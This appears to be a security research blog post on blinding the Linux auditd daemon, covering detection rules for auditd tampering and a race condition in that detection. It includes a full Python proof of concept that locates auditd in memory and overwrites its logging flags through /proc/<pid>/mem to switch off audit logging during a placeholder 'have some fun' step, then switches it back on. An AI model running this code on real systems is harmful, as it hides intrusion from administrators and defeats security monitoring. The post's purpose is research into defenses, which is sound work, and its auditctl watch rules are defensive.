---
title: auditd blinder part II
excerpt: "auditd blinder part II"
date: 2026-10-19
categories: [Researcrh]
tags: [Research, Malware, Red Team]
---
---

Race Condition in auditd Tampering Detection While Evaluating Defenses Against auditd Blinder

---

While investigating detection and protection techniques for [auditd blinder](https://sapellaniz.github.io/posts/auditd_blinder/), I came across [Blindsiding auditd for Fun and Profit](https://code-white.com/blog/2023-08-blindsiding-auditd-for-fun-and-profit/) by Code White.

Their [apollon PoC](https://github.com/codewhitesec/apollon) is more sophisticated than auditd blinder: it overwrites GOT entries and filters out specific audit events. However, its approach to modifying process memory through /proc/<pid>/mem no longer works on kernels that enforce the proc_mem.force_override restriction, introduced in Linux 6.12 to address the long-standing FOLL_FORCE loophole.

# Detection
Regarding **detection**, the approach described in Code White's article works like a charm. I extended it by monitoring two additional files, /proc/\<auditd_pid\>/maps and /run/auditd.pid, and enabling audit's immutable mode.

If you want immutable mode to take effect while monitoring these files, you must include -e 2 in the service configuration:

```
ExecStartPost=/bin/bash -c "auditctl -w /proc/$(cat /run/audit/auditd.pid)/maps -F key=auditd-tampering"
ExecStartPost=/bin/bash -c "auditctl -w /proc/$(cat /run/audit/auditd.pid)/mem -F key=auditd-tampering"
ExecStartPost=/bin/bash -c "auditctl -w /run/audit/auditd.pid -F key=auditd-tampering"
ExecStartPost=/bin/bash -c "auditctl -e 2"
```

# Race condition
While testing these audit rules, I noticed inconsistent results. With the previous audit rules enabled, each monitored file access should have generated four audit records: PROCTITLE, CWD, PATH, and SYSCALL. However, in most cases, auditd only managed to record a single SYSCALL record for the first file accessed, or no records at all. None of the other record types were logged.

To investigate this behavior, I wrote the exploit entirely in assembly and optimizing it to execute as quickly as possible. It was executed so quickly that even the execve syscall used to launch the exploit was not recorded!

However, executing a standalone exploit binary requires a root user to create or download the file and grant it execution permissions. I therefore explored a less conspicuous alternative: having a root user launch the exploit directly from a Python interpreter.

With this approach, only the execve syscall launching Python is recorded in most cases, while the subsequent malicious activity escape auditing.

Here is the Python PoC:


```python
from time import sleep

write_logs_offset     = 0x26018
conf_llist_cnt_offset = 0x20130

# 1. Get auditd pid
with open("/run/audit/auditd.pid", 'r') as f1:
    auditd_pid = f1.read()[:-1]
    # 2. Get auditd VBA
    with open("/proc/"+auditd_pid+"/maps") as f2:
        for mapping in f2.readlines():
            if "auditd" in mapping.split()[-1]:
                auditd_vba = mapping.split()[0].split('-')[0]
                auditd_vba = int(auditd_vba, 16)

                with open("/proc/"+auditd_pid+"/mem", "r+b", buffering=0) as mem:
                    # 3. Disable logging
                    mem.seek(auditd_vba + write_logs_offset)
                    #mem.write(b"\x00")
                    mem.seek(auditd_vba + conf_llist_cnt_offset)
                    mem.write(b"\x00")

                    # 4. Have some fun
                    # TBD

                    # 5. Enable logging
                    sleep(1)
                    mem.seek(auditd_vba + write_logs_offset)
                    mem.write(b"\x01")
                    mem.seek(auditd_vba + conf_llist_cnt_offset)
                    mem.write(b"\x01")

                break
```
